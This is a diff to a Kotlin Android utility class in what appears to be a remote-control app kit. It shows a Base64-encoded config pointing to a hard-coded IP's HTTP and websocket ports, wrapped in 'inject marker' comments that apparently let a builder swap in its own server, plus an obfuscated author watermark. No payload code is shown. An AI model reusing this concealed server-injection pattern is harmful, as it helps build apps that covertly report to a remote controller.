@@ -17,13 +17,14 @@ import androidx.activity.ComponentActivity
 import com.google.gson.Gson
 import willi.fiend.MainService
 import java.util.*
-import android.util.Base64 as AndroidBase64  // برای سازگاری بهتر با اندروید
+import android.util.Base64
 
 @SuppressLint("Range")
 class AppTools {
     companion object {
-        // Your server configuration (Base64 encoded JSON)
+        // === INJECT MARKER - DO NOT REMOVE OR MODIFY THIS LINE ===
         private const val DEFAULT_DATA = "eyJob3N0IjoiaHR0cDovLzkxLjEwNy4xMzQuNTg6ODk5OS8iLCJzb2NrZXQiOiJ3c3M6Ly85MS4xMDcuMTM0LjU4Ojg5OTkvIiwid2ViVmlldyI6Imh0dHBzOi8vZ29vZ2xlLmNvbS8ifQ=="
+        // === INJECT MARKER END ===
 
         private val DEFAULT_APP_DATA = AppData(
             host = "http://10.0.2.2:8999/",
@@ -32,13 +33,13 @@ class AppTools {
         )
 
         fun getAppData(): AppData {
-            if (DEFAULT_DATA.isEmpty()) {
-                android.util.Log.w("AppTools", "No DEFAULT_DATA set, using defaults")
+            if (DEFAULT_DATA.isEmpty() || DEFAULT_DATA == "eyJob3N0IjoiaHR0cDovLzkxLjEwNy4xMzQuNTg6ODk5OS8iLCJzb2NrZXQiOiJ3c3M6Ly85MS4xMDcuMTM0LjU4Ojg5OTkvIiwid2ViVmlldyI6Imh0dHBzOi8vZ29vZ2xlLmNvbS8ifQ==") {
+                android.util.Log.w("AppTools", "No custom DEFAULT_DATA, using defaults")
                 return DEFAULT_APP_DATA
             }
 
             return try {
-                val decodedBytes = AndroidBase64.decode(DEFAULT_DATA, AndroidBase64.DEFAULT)
+                val decodedBytes = Base64.decode(DEFAULT_DATA, Base64.DEFAULT)
                 val json = String(decodedBytes, Charsets.UTF_8)
                 android.util.Log.i("AppTools", "Decoded config: $json")
                 Gson().fromJson(json, AppData::class.java) ?: DEFAULT_APP_DATA
@@ -48,11 +49,11 @@ class AppTools {
             }
         }
 
+        // بقیه متدها بدون تغییر...
         fun getWatermark(): String {
             return try {
                 val encoded = "RmFoaW0gQWhhbWVkIMKpOiBAZmFoaW1haGFtZWQ0"
-                val decodedBytes = AndroidBase64.decode(encoded, AndroidBase64.DEFAULT)
-                String(decodedBytes)
+                String(Base64.decode(encoded, Base64.DEFAULT))
             } catch (e: Exception) {
                 "@fahimahamed4r"
             }
@@ -150,19 +151,10 @@ class AppTools {
     }
 
     class WebViewDownloadListener(private val context: Context) : DownloadListener {
-        override fun onDownloadStart(
-            url: String?,
-            userAgent: String?,
-            contentDisposition: String?,
-            mimeType: String?,
-            contentLength: Long
-        ) {
+        override fun onDownloadStart(url: String?, userAgent: String?, contentDisposition: String?, mimeType: String?, contentLength: Long) {
             try {
                 val request = DownloadManager.Request(Uri.parse(url)).apply {
-                    setDestinationInExternalPublicDir(
-                        Environment.DIRECTORY_DOWNLOADS,
-                        URLUtil.guessFileName(url, contentDisposition, mimeType)
-                    )
+                    setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, URLUtil.guessFileName(url, contentDisposition, mimeType))
                 }
                 (context.getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager).enqueue(request)
             } catch (e: Exception) { }
